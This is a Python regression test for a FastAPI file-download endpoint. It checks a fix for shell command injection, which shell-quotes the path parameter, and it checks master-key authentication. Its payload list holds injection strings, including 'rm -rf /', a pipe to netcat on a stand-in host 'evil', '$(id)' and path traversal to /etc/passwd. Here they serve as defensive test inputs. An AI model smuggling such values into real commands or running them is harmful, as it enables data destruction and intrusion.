"""
Regression + unit tests for the /files download endpoint (agentic/api.py).

Closes the unauthenticated OS command-injection (CWE-78) in `download_file`:
the endpoint reads a file INSIDE kali-sandbox via the `kali_shell` MCP tool,
which runs the command through `bash -c`. The untrusted `path` query param was
interpolated into that shell string with only an `os.path.normpath` + `/tmp/`
prefix check, neither of which strips shell metacharacters (`;`, `|`, `` ` ``,
`$(...)`). A path like `/tmp/x; id` therefore ran a second command.

The fix (1) `shlex.quote`s the path so it is always a single literal argument,
and (2) adds an auth dependency so the route is not unauthenticated: since step
1.9 `Depends(require_configured_master_auth)`, the master key only (the webapp
is its one caller; NF-01).

Needs fastapi + the agent runtime (imports api.py), so it runs in the agent
container, not on a bare host:
    docker compose exec agent python3 tests/test_files_injection.py

It skips gracefully (exit 0) if fastapi is unavailable, so it is safe to run
anywhere.
"""

import asyncio
import base64
import os
import shlex
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # agentic/

results = []


def check(name, cond):
    results.append((name, bool(cond)))
    print(f"  [{'PASS' if cond else 'FAIL'}] {name}")


class _FakeToolExecutor:
    """Records every kali_shell command and returns canned success output."""

    def __init__(self):
        self.commands = []

    async def execute(self, tool_name, tool_args, phase, skip_phase_check=False):
        cmd = tool_args.get("command", "")
        self.commands.append((tool_name, cmd))
        if cmd.startswith("test -f"):
            # pretend the file exists (size 5) so the handler proceeds to base64
            return {"success": True, "output": "5"}
        if cmd.startswith("base64"):
            return {"success": True, "output": base64.b64encode(b"hello").decode()}
        return {"success": True, "output": ""}


class _FakeOrchestrator:
    def __init__(self):
        self.tool_executor = _FakeToolExecutor()


def _call(api, path):
    """Invoke the route coroutine directly (bypasses FastAPI dep-injection, so
    it exercises the handler body regardless of the auth dependency)."""
    return asyncio.run(api.download_file(path=path))


# Payloads that MUST end up as a single shell argument. Mix of injection vectors
# and legitimate-but-tricky filenames (spaces/parens/quotes) that the pre-fix
# unquoted interpolation would have BROKEN as well as made injectable.
INJECTION_PAYLOADS = [
    ("/tmp/x; touch /tmp/PWNED", "semicolon"),
    ("/tmp/x && rm -rf /", "and-rm"),
    ("/tmp/x | nc evil 1", "pipe"),
    ("/tmp/$(id)", "dollar-paren"),
    ("/tmp/`id`", "backtick"),
    ("/tmp/x\nid", "newline"),
    ("/tmp/x > /tmp/out", "redirect"),
    ("/tmp/x${IFS}id", "ifs-brace"),
    # legitimate filenames that also require quoting to work at all:
    ("/tmp/my report (1).pdf", "spaces-parens"),
    ("/tmp/a'b.txt", "single-quote"),
    ('/tmp/a"b.txt', "double-quote"),
]


def main():
    try:
        import api  # noqa: E402  (needs fastapi + agent deps)
        import llm_guard  # noqa: E402
    except Exception as exc:
        print(f"SKIP: cannot import api ({exc}); run inside the agent container")
        return 0

    fake = _FakeOrchestrator()
    api.orchestrator = fake

    # ---- 1. Definitive correctness: every command the handler builds must
    #         shlex.split back to exactly [tool, args..., <the literal path>].
    #         If any metacharacter escaped the quoting, shlex.split would yield
    #         extra tokens and this fails. This covers ALL vectors at once. ----
    for payload, label in INJECTION_PAYLOADS:
        fake.tool_executor.commands.clear()
        _call(api, payload)
        normalized = os.path.normpath(payload)
        cmds = [c for _, c in fake.tool_executor.commands]
        ok = bool(cmds)
        for c in cmds:
            tokens = shlex.split(c)
            # the LAST token must be the whole path, verbatim; and the command
            # must be exactly the expected argv (no injected trailing tokens).
            if c.startswith("base64"):
                ok = ok and tokens == ["base64", "-w0", normalized]
            elif c.startswith("test -f"):
                ok = ok and tokens == ["test", "-f", normalized, "&&", "stat", "-c", "%s", normalized]
            else:
                ok = False
        check(f"quoting round-trips to one arg ({label})", ok)

    # ---- 2. Benign path is unchanged (no needless quoting / no regression) ----
    fake.tool_executor.commands.clear()
    resp = _call(api, "/tmp/report.pdf")
    benign_cmds = [c for _, c in fake.tool_executor.commands]
    check(
        "benign: safe path passes through without added quotes",
        "base64 -w0 /tmp/report.pdf" in benign_cmds,
    )
    check(
        "benign: returns the decoded bytes (200-path)",
        getattr(resp, "body", b"") == b"hello",
    )

    # ---- 3. Legit filename with spaces still downloads (functional, not just
    #         safe): pre-fix this broke; post-fix it must reach base64 and 200. ----
    fake.tool_executor.commands.clear()
    resp_sp = _call(api, "/tmp/my report (1).pdf")
    check(
        "spaces: filename with spaces reaches base64 and returns bytes",
        getattr(resp_sp, "body", b"") == b"hello"
        and any(c == "base64 -w0 '/tmp/my report (1).pdf'" for _, c in fake.tool_executor.commands),
    )

    # ---- 4. Prefix / traversal guards still reject non-/tmp paths ----
    r_outside = _call(api, "/etc/passwd")
    check("guard: non-/tmp path is forbidden (403)", getattr(r_outside, "status_code", None) == 403)
    r_trav = _call(api, "/tmp/../etc/passwd")
    check("guard: /tmp/../ traversal is forbidden (403)", getattr(r_trav, "status_code", None) == 403)

    # ---- 5. The route carries the master-key dependency (declared; NF-01, step 1.9) ----
    files_route = next(
        (r for r in api.app.routes if getattr(r, "path", None) == "/files"), None
    )
    dep_calls = []
    if files_route is not None and getattr(files_route, "dependant", None) is not None:
        dep_calls = [d.call for d in files_route.dependant.dependencies]
    check(
        "auth: /files declares Depends(require_configured_master_auth)",
        llm_guard.require_configured_master_auth in dep_calls,
    )
    check(
        "auth: /files no longer takes the scanner key (require_internal_auth_only)",
        llm_guard.require_internal_auth_only not in dep_calls,
    )

    # ---- 6. The dependency actually ENFORCES via a real request (TestClient).
    #         Sets INTERNAL_API_KEY so llm_guard is fail-CLOSED, then checks
    #         missing/wrong/correct key. ----
    try:
        from fastapi.testclient import TestClient

        prev_key = os.environ.get("INTERNAL_API_KEY")
        os.environ["INTERNAL_API_KEY"] = "unit-test-key"
        # Reset any cached fail-open warning so behaviour reflects the key.
        client = TestClient(api.app)  # no `with`: does not run lifespan

        r_nokey = client.get("/files", params={"path": "/tmp/report.pdf"})
        check("auth(enforce): no key -> 401", r_nokey.status_code == 401)

        r_badkey = client.get(
            "/files", params={"path": "/tmp/report.pdf"},
            headers={"x-internal-key": "wrong"},
        )
        check("auth(enforce): wrong key -> 401", r_badkey.status_code == 401)

        r_okkey = client.get(
            "/files", params={"path": "/tmp/report.pdf"},
            headers={"x-internal-key": "unit-test-key"},
        )
        check(
            "auth(enforce): correct key -> reaches handler (not 401)",
            r_okkey.status_code != 401,
        )
        # and injection is still inert through the full request path:
        fake.tool_executor.commands.clear()
        client.get(
            "/files", params={"path": "/tmp/x; touch /tmp/PWNED"},
            headers={"x-internal-key": "unit-test-key"},
        )
        end_to_end_ok = all(
            shlex.split(c) and "/tmp/x; touch /tmp/PWNED" in shlex.split(c)
            for _, c in fake.tool_executor.commands
        ) and bool(fake.tool_executor.commands)
        check("auth(enforce): injection inert through full HTTP path", end_to_end_ok)

        if prev_key is None:
            os.environ.pop("INTERNAL_API_KEY", None)
        else:
            os.environ["INTERNAL_API_KEY"] = prev_key
    except Exception as exc:
        print(f"  [SKIP] TestClient auth-enforcement checks unavailable ({exc})")

    # ---- Summary ----
    passed = sum(1 for _, ok in results if ok)
    total = len(results)
    print(f"\n{passed}/{total} checks passed")
    return 0 if passed == total else 1


def test_files_injection():
    """pytest entrypoint: run the script-style checks; main() returns
    non-zero on any failed check (bucket-1 runner-compat conversion)."""
    assert main() == 0


if __name__ == "__main__":
    sys.exit(main())
